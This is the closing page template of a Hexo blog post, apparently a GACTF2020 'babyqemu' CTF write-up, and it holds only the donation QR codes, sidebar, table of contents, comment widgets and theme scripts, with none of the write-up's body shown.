+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-writeup/" rel="tag"># CTF writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/28/nest/" rel="next" title="i春秋网络内生安全实验场圣诞赛">
+                <i class="fa fa-chevron-left"></i> i春秋网络内生安全实验场圣诞赛
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.png"
+                alt="ama2in9" />
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">56</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">29</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GACTF2020"><span class="nav-number">1.</span> <span class="nav-text">GACTF2020</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyqemu"><span class="nav-number">1.1.</span> <span class="nav-text">babyqemu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-c"><span class="nav-number">1.1.2.</span> <span class="nav-text">exp.c</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#踩坑"><span class="nav-number">1.1.3.</span> <span class="nav-text">踩坑</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2020/09/02/gactf2020/';
+        this.page.identifier = '2020/09/02/gactf2020/';
+        this.page.title = 'gactf2020';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
